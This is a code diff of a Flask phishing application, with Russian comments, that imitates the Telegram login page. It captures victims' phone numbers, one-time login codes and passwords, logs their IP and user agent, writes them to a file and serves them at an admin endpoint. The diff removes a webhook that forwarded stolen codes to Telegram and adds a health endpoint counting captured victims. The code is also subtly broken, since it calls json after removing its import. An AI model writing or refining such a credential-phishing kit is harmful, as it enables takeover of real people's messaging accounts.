@@ -1,53 +1,41 @@
 import os
-import json
-import requests
+import random
+import time
 from datetime import datetime
-from flask import Flask, request, jsonify, render_template, redirect, url_for
+from flask import Flask, request, jsonify, render_template
 from dotenv import load_dotenv
 
 load_dotenv()
 
 app = Flask(__name__)
+app.secret_key = os.getenv('SECRET_KEY', 'super-secret-key')
 
 # 🎯 База данных "жертв"
 captured_data = []
 
 class TelegramPhisher:
     def __init__(self):
-        self.webhook_url = os.getenv('WEBHOOK_URL', '')  # Для отправки данных в Telegram
+        self.webhook_url = os.getenv('WEBHOOK_URL', '')
     
-    def save_credentials(self, phone, code, password=None, session_data=None):
+    def save_credentials(self, phone, code, password=None):
         """Сохраняем перехваченные данные"""
         victim_data = {
             'phone': phone,
             'code': code,
             'password': password,
-            'session_data': session_data,
             'ip': request.remote_addr,
             'user_agent': request.headers.get('User-Agent'),
-            'timestamp': datetime.now().isoformat(),
-            'status': 'captured'
+            'timestamp': datetime.now().isoformat()
         }
         
         captured_data.append(victim_data)
-        
-        # Отправляем уведомление (опционально)
-        if self.webhook_url:
-            self.send_notification(victim_data)
-        
         print(f"🎣 Перехвачены данные: {phone} | Код: {code}")
+        
+        # Сохраняем в файл (на всякий случай)
+        with open('captured_data.json', 'w', encoding='utf-8') as f:
+            json.dump(captured_data, f, ensure_ascii=False, indent=2)
+        
         return victim_data
-    
-    def send_notification(self, data):
-        """Отправляем уведомление о новой жертве"""
-        try:
-            message = f"🎣 Новые данные!\n📱 Телефон: {data['phone']}\n🔐 Код: {data['code']}"
-            if data.get('password'):
-                message += f"\n🔑 Пароль: {data['password']}"
-            
-            requests.post(self.webhook_url, json={'text': message})
-        except:
-            pass
 
 # Инициализация фишера
 phisher = TelegramPhisher()
@@ -68,11 +56,6 @@ def auth_start():
         if not phone:
             return jsonify({'success': False, 'error': 'Введите номер телефона'})
         
-        # Сохраняем номер
-        session_id = f"phish_{int(time.time())}"
-        request.session['phish_id'] = session_id
-        request.session['phone'] = phone
-        
         # Имитируем отправку кода
         fake_code = str(random.randint(10000, 99999))
         
@@ -92,7 +75,7 @@ def auth_code():
     try:
         data = request.get_json()
         code = data.get('code', '').strip()
-        phone = data.get('phone', '')  # На всякий случай
+        phone = data.get('phone', '')
         
         if not code:
             return jsonify({'success': False, 'error': 'Введите код'})
@@ -154,10 +137,35 @@ def success():
     <head>
         <title>Telegram</title>
         <style>
-            body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #18222d; color: white; margin: 0; padding: 20px; }
-            .container { max-width: 400px; margin: 100px auto; text-align: center; }
-            .logo { font-size: 48px; margin-bottom: 20px; }
-            .btn { background: #0088cc; color: white; padding: 15px 30px; border: none; border-radius: 10px; font-size: 16px; cursor: pointer; }
+            body { 
+                font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
+                background: #18222d; 
+                color: white; 
+                margin: 0; 
+                padding: 20px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                min-height: 100vh;
+            }
+            .container { 
+                max-width: 400px; 
+                text-align: center; 
+            }
+            .logo { 
+                font-size: 48px; 
+                margin-bottom: 20px; 
+            }
+            .btn { 
+                background: #0088cc; 
+                color: white; 
+                padding: 15px 30px; 
+                border: none; 
+                border-radius: 10px; 
+                font-size: 16px; 
+                cursor: pointer;
+                margin-top: 20px;
+            }
         </style>
     </head>
     <body>
@@ -177,6 +185,16 @@ def admin():
     return jsonify({
         'total_captured': len(captured_data),
         'data': captured_data
+    })
+
+@app.route('/health')
+def health():
+    """Проверка здоровья сервера"""
+    return jsonify({
+        'status': 'OK',
+        'service': 'Telegram Phish',
+        'timestamp': datetime.now().isoformat(),
+        'captured_count': len(captured_data)
     })
 
 if __name__ == '__main__':
